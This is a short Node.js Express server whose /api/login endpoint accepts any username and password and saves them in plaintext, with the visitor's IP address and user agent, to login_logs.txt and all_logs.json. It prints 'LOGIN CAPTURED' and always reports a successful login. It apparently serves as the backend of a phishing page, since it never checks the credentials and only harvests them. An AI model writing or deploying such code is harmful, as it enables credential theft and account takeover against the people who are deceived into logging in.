const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static('public')); // Serve your HTML from /public folder

// LOG ALL LOGIN ATTEMPTS
app.post('/api/login', (req, res) => {
    const { username, password, timestamp, userAgent } = req.body;
    
    // Get real IP
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
    
    const loginData = {
        timestamp,
        ip,
        userAgent,
        username,
        password,
        success: true
    };
    
    // LOG TO CONSOLE (IMMEDIATE)
    console.log('🔥 LOGIN CAPTURED:', loginData);
    
    // SAVE TO FILE (PERMANENT)
    const logEntry = `${JSON.stringify(loginData, null, 2)}\n\n`;
    fs.appendFileSync('login_logs.txt', logEntry);
    
    // Optional: Save to JSON array
    const logsPath = path.join(__dirname, 'all_logs.json');
    let allLogs = [];
    if (fs.existsSync(logsPath)) {
        allLogs = JSON.parse(fs.readFileSync(logsPath, 'utf8'));
    }
    allLogs.push(loginData);
    fs.writeFileSync(logsPath, JSON.stringify(allLogs, null, 2));
    
    res.json({ success: true, message: 'Logged in' });
});

app.listen(3000, () => {
    console.log('🚀 Server running on http://localhost:3000');
    console.log('📝 Logs saved to: login_logs.txt & all_logs.json');
});